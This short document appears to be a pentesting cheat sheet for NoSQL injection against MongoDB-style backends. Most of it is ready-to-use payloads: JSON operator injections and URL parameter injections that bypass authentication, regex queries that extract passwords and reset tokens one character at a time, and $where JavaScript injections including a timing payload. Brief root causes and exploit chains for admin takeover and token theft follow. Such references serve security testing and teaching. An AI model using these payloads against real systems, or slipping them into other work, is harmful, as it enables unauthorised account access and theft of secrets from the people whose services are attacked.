# NoSQL Injection Reference

## Attack Surface Signals
- MongoDB, CouchDB, DynamoDB backends.
- JSON-based API requests: `{"username": "admin", "password": "..."}`.
- Query parameters that accept objects or array notations: `username[$ne]=admin`, `password[$regex]=^a`.

## Attack Patterns & Payloads
1. **JSON Body Operator Injection**:
   - Authentication bypass:
     `{"username": "admin", "password": {"$ne": ""}}`
     `{"username": {"$gt": ""}, "password": {"$gt": ""}}`
     `{"username": {"$in": ["admin", "root"]}, "password": {"$ne": "invalid"}}`
2. **URL Parameter Array / Object Injection**:
   - `?username[$ne]=null&password[$ne]=null`
   - `?user[$regex]=^admin&pass[$regex]=^a`
3. **Regex Extraction (Blind Exfiltration)**:
   - Character-by-character data leakage via regular expression matching:
     `{"username": "admin", "password": {"$regex": "^a"}}`
     `{"username": "admin", "password": {"$regex": "^ab"}}`
4. **JavaScript `$where` Clause Injection**:
   - String concatenation inside Mongo `$where` or `mapReduce`:
     `'; return true; var dummy='`
     `' || this.password.match(/^a.*$/) || '`
     `' || sleep(5000) || '`

## Common Root Causes
- Direct pass-through of parsed JSON or query objects into ORM/ODM query methods (`User.find(req.body)`).
- Use of dynamic JavaScript evaluation expressions (`$where`) in MongoDB queries.

## Exploit Chains
- **NoSQLi → Auth Bypass**: Bypassing login credentials to access admin accounts.
- **NoSQLi → Secret Token Extraction**: Blindly extracting reset tokens or API keys character by character.
